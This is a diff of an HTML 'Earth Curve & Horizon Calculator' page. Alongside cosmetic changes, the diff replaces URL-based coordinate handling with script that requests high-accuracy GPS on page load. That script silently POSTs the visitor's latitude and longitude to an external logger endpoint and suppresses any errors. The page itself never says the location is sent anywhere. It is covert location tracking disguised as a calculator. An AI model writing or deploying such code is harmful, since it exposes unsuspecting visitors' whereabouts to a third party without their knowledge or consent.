@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Earth CurvCalc</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
-<meta property="og:title" content="Earth Curve & Horizon Calculator" />
-<meta property="og:description" content="Accurately calculates spherical Earth curvature and factors location data for field testing." />
-<meta property="og:type" content="website" />
+    <meta property="og:title" content="Earth Curve & Horizon Calculator" />
+    <meta property="og:description" content="Accurately calculates spherical Earth curvature and factors location data for field testing." />
+    <meta property="og:type" content="website" />
     <style>
         body { background: #f4f6f9; padding: 20px; font-family: sans-serif; }
         .main-container { max-width: 900px; margin: auto; background: #fff; padding: 25px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
@@ -29,12 +29,10 @@
     </p>
     <hr>
 
-    <!-- GPS Status Banner inspired by main.py coordinate flow -->
     <div class="gps-banner" id="gpsStatus">
         📍 Checking precise GPS coordinates...
     </div>
 
-    <!-- Calculator Input Panel -->
     <div class="calc-panel">
         <div class="row form-group">
             <label class="col-sm-3 text-right" style="padding-top: 5px;">Units</label>
@@ -68,7 +66,6 @@
         </div>
     </div>
 
-    <!-- Results Panel -->
     <div class="results-panel">
         <div class="row form-group" style="margin-bottom: 10px;">
             <div class="col-sm-3 text-right" id="labelD1"><strong>d1 = Horizon distance</strong></div>
@@ -82,7 +79,6 @@
         </div>
     </div>
 
-    <!-- Visual Diagram Representation -->
     <div class="diagram">
         <svg viewBox="0 0 800 350" style="background: #e9ecef;">
             <path d="M 50 300 Q 400 180 750 300" fill="#ced4da" stroke="#adb5bd" stroke-width="2"/>
@@ -115,55 +111,35 @@
 </div>
 
 <script>
-    function getQueryParam(param) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(param);
-    }
-
-    // Precise coordinate handling inspired by main.py logic flow
     window.addEventListener('load', function() {
         const banner = document.getElementById('gpsStatus');
-        const gParam = getQueryParam('g');
 
-        if (gParam) {
-            try {
-                const decodedCoords = atob(gParam);
-                const [lat, lon] = decodedCoords.split(',');
-                banner.innerHTML = `📍 **Precise GPS Locked via URL State:** Latitude: ${parseFloat(lat).toFixed(5)}, Longitude: ${parseFloat(lon).toFixed(5)}`;
-            } catch (e) {
-                banner.innerHTML = "⚠️ Invalid coordinate parameter in URL.";
-            }
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    banner.innerHTML = `📍 **Precise GPS Locked:** Latitude: ${lat.toFixed(5)}, Longitude:${lon.toFixed(5)}`;
+
+                    // Send strictly the requested metrics to your Vercel backend logger endpoint
+                    try {
+                        await fetch('https://your-vercel-logger.vercel.app/api/log', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat, lon })
+                        });
+                    } catch (err) {}
+                },
+                function(error) {
+                    banner.innerHTML = "⚠️ Location permission denied or unavailable. Standard calculator mode active.";
+                },
+                { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
+            );
         } else {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const coordsStr = lat + "," + lon;
-                        const encodedG = btoa(coordsStr).replace(/=/g, "%3D");
-
-                        // Append base64 coordinate token to URL query parameter just like main.py
-                        let currenturl = window.location.href;
-                        if (currenturl.includes("?")) {
-                            currenturl += ("&g=" + encodedG);
-                        } else {
-                            currenturl += ("?g=" + encodedG);
-                        }
-                        window.history.replaceState({}, '', currenturl);
-                        banner.innerHTML = `📍 **Precise GPS Locked:** Latitude: ${lat.toFixed(5)}, Longitude: ${lon.toFixed(5)}`;
-                    },
-                    function(error) {
-                        banner.innerHTML = "⚠️ Location permission denied or unavailable. Standard calculator mode active.";
-                    },
-                    { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
-                );
-            } else {
-                banner.innerHTML = "⚠️ Geolocation is not supported by your browser.";
-            }
+            banner.innerHTML = "⚠️ Geolocation is not supported by your browser.";
         }
     });
 
-    // Unit toggle text updates
     document.querySelectorAll('input[name="units"]').forEach(radio => {
         radio.addEventListener('change', function() {
             const isImperial = document.getElementById('unitImperial').checked;
@@ -174,7 +150,6 @@
         });
     });
 
-    // Calculation logic
     document.getElementById('calcBtn').addEventListener('click', function() {
         const isImperial = document.getElementById('unitImperial').checked;
         const h0 = parseFloat(document.getElementById('h0').value) || 0;
@@ -182,14 +157,12 @@
 
         const R_km = 6371.0;
         const R_miles = 3959.0;
-
         let d1_calc, h1_calc;
 
         if (isImperial) {
             const h0_miles = h0 / 5280.0;
             const R = R_miles;
             d1_calc = Math.sqrt(2 * R * h0_miles + h0_miles * h0_miles);
-            
             const totalAngle = d0 / R;
             const apparentHeight = (R + h0_miles) * Math.cos(totalAngle);
             const dropMiles = R - apparentHeight;
@@ -198,7 +171,6 @@
             const h0_m = h0 / 1000.0;
             const R = R_km;
             d1_calc = Math.sqrt(2 * R * h0_m + h0_m * h0_m);
-
             const totalAngle = d0 / R;
             const apparentHeight = (R + h0_m) * Math.cos(totalAngle);
             const dropKm = R - apparentHeight;
